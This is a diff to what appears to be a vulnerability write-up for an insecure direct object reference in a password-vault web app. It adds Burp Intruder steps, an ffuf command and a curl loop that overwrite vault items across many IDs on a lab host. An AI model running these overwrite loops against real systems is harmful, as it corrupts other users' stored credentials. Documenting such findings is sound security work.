@@ -37,10 +37,39 @@ Attackers can modify, corrupt, or delete other users' stored credentials. This a
 
 ### Step 1: Identify Target Vault Item IDs
 
-Create item in vault if you don't have one, if you have one in you vault, Click on Edit --> Update Item --> Check request in Burp for identifying the item id.
--  ![[image_showing_vault_id.png]]
-Then Fuzz the [item_id] from 0 to 100 using ffuf or burp intruder.
--  
+Create an item in your own vault first, then use Burp Intruder or ffuf to enumerate all existing item IDs across all user accounts:
+
+**Method 1: Using Burp Intruder**
+1. Create/edit a vault item to capture the PUT request in Burp
+2. Send request to Intruder
+3. Set payload position on the item ID in URL: `/vault/edit/§1§`
+4. Set payload type to Numbers, from 1 to 1000
+5. Add grep extract rule for `"success":true` in response
+6. Start attack - any request returning success indicates a valid item ID
+
+**Method 2: Using ffuf**
+```bash
+ffuf -u http://10.0.0.10/vault/edit/FUZZ \
+  -w /path/to/wordlist.txt \
+  -H "Cookie: connect.sid=[your_session]" \
+  -H "Content-Type: application/json" \
+  -d '{"vaulttitle":"test","vaultusername":"test","vaultpassword":"test"}' \
+  -mc 200 \
+  -fs 0
+```
+
+**Method 3: Sequential Testing with curl**
+```bash
+for id in {1..100}; do
+  echo "Testing ID: $id"
+  curl -s -X PUT http://10.0.0.10/vault/edit/$id \
+    -H "Cookie: connect.sid=[session]" \
+    -H "Content-Type: application/json" \
+    -d '{"vaulttitle":"test","vaultusername":"test","vaultpassword":"test"}' | grep -q '"success":true' && echo "Valid ID: $id"
+done
+```
+
+**Expected Results:** Multiple item IDs will return success, indicating they exist and can be modified (IDOR confirmed).
 
 
 ### Step 2: Attempt to Edit Own Vault Item (Control)
